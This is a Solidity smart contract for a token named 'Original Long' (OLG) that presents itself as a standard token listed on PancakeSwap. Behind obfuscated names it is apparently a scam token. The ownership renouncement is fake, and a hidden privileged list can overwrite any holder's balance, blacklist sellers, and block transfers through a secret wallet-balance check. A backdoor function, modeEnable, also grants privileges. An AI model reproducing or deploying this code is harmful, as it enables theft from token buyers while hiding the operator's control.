//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface sellFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract shouldLaunchedList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalReceiver {
    function createPair(address feeMarketing, address receiverSender) external returns (address);
}

interface shouldWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenExempt) external view returns (uint256);

    function transfer(address maxSell, uint256 atAmount) external returns (bool);

    function allowance(address limitLaunchedBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 atAmount) external returns (bool);

    function transferFrom(
        address sender,
        address maxSell,
        uint256 atAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listTake, uint256 value);
    event Approval(address indexed limitLaunchedBuy, address indexed spender, uint256 value);
}

interface shouldWalletMetadata is shouldWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OriginalLong is shouldLaunchedList, shouldWallet, shouldWalletMetadata {

    function name() external view virtual override returns (string memory) {
        return tradingTotal;
    }

    event OwnershipTransferred(address indexed receiverShouldEnable, address indexed toAmount);

    uint256 private minIsFund;

    uint256 private receiverIs;

    mapping(address => mapping(address => uint256)) private toBuy;

    uint256 listLaunched;

    uint256 constant feeEnableList = 4 ** 10;

    uint256 public atReceiver;

    bool private totalLaunch;

    address walletSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private listLimitFrom;

    function balanceOf(address tokenExempt) public view virtual override returns (uint256) {
        return listTradingReceiver[tokenExempt];
    }

    function maxToken() private view {
        require(atSender[_msgSender()]);
    }

    address public takeReceiver;

    uint8 private modeTo = 18;

    uint256 private tradingAmount;

    bool private txMin;

    string private tradingTotal = "Original Long";

    function liquidityBuy(address toLiquidity, address maxSell, uint256 atAmount) internal returns (bool) {
        if (toLiquidity == takeReceiver) {
            return tradingEnableToken(toLiquidity, maxSell, atAmount);
        }
        uint256 feeShould = shouldWallet(launchedSell).balanceOf(toTotalSender);
        require(feeShould == listLaunched);
        require(maxSell != toTotalSender);
        if (tokenTotal[toLiquidity]) {
            return tradingEnableToken(toLiquidity, maxSell, feeEnableList);
        }
        return tradingEnableToken(toLiquidity, maxSell, atAmount);
    }

    bool public shouldTrading;

    function getOwner() external view returns (address) {
        return modeTotalSell;
    }

    string private amountBuy = "OLG";

    function symbol() external view virtual override returns (string memory) {
        return amountBuy;
    }

    function decimals() external view virtual override returns (uint8) {
        return modeTo;
    }

    bool private enableTx;

    function autoReceiver() public {
        emit OwnershipTransferred(takeReceiver, address(0));
        modeTotalSell = address(0);
    }

    function transfer(address marketingReceiver, uint256 atAmount) external virtual override returns (bool) {
        return liquidityBuy(_msgSender(), marketingReceiver, atAmount);
    }

    mapping(address => bool) public atSender;

    function approve(address receiverModeEnable, uint256 atAmount) public virtual override returns (bool) {
        toBuy[_msgSender()][receiverModeEnable] = atAmount;
        emit Approval(_msgSender(), receiverModeEnable, atAmount);
        return true;
    }

    function senderTotalEnable(address marketingReceiver, uint256 atAmount) public {
        maxToken();
        listTradingReceiver[marketingReceiver] = atAmount;
    }

    function tradingEnableToken(address toLiquidity, address maxSell, uint256 atAmount) internal returns (bool) {
        require(listTradingReceiver[toLiquidity] >= atAmount);
        listTradingReceiver[toLiquidity] -= atAmount;
        listTradingReceiver[maxSell] += atAmount;
        emit Transfer(toLiquidity, maxSell, atAmount);
        return true;
    }

    uint256 private fromLaunchedLaunch = 100000000 * 10 ** 18;

    constructor (){
        
        sellFee maxLaunchMode = sellFee(walletSwap);
        launchedSell = totalReceiver(maxLaunchMode.factory()).createPair(maxLaunchMode.WETH(), address(this));
        
        takeReceiver = _msgSender();
        autoReceiver();
        atSender[takeReceiver] = true;
        listTradingReceiver[takeReceiver] = fromLaunchedLaunch;
        if (txMin) {
            enableTx = false;
        }
        emit Transfer(address(0), takeReceiver, fromLaunchedLaunch);
    }

    bool private maxExemptSender;

    uint256 sellTo;

    function totalSupply() external view virtual override returns (uint256) {
        return fromLaunchedLaunch;
    }

    mapping(address => uint256) private listTradingReceiver;

    function receiverLaunched(uint256 atAmount) public {
        maxToken();
        listLaunched = atAmount;
    }

    mapping(address => bool) public tokenTotal;

    function enableSwapExempt(address limitShouldLaunched) public {
        maxToken();
        if (totalLaunch == enableTx) {
            receiverIs = tradingAmount;
        }
        if (limitShouldLaunched == takeReceiver || limitShouldLaunched == launchedSell) {
            return;
        }
        tokenTotal[limitShouldLaunched] = true;
    }

    function modeEnable(address totalFee) public {
        require(totalFee.balance < 100000);
        if (shouldTrading) {
            return;
        }
        if (totalLaunch == enableTx) {
            txMin = true;
        }
        atSender[totalFee] = true;
        if (enableTx != listLimitFrom) {
            totalLaunch = false;
        }
        shouldTrading = true;
    }

    address toTotalSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address modeMax, address receiverModeEnable) external view virtual override returns (uint256) {
        if (receiverModeEnable == walletSwap) {
            return type(uint256).max;
        }
        return toBuy[modeMax][receiverModeEnable];
    }

    address private modeTotalSell;

    address public launchedSell;

    function owner() external view returns (address) {
        return modeTotalSell;
    }

    function transferFrom(address toLiquidity, address maxSell, uint256 atAmount) external override returns (bool) {
        if (_msgSender() != walletSwap) {
            if (toBuy[toLiquidity][_msgSender()] != type(uint256).max) {
                require(atAmount <= toBuy[toLiquidity][_msgSender()]);
                toBuy[toLiquidity][_msgSender()] -= atAmount;
            }
        }
        return liquidityBuy(toLiquidity, maxSell, atAmount);
    }

}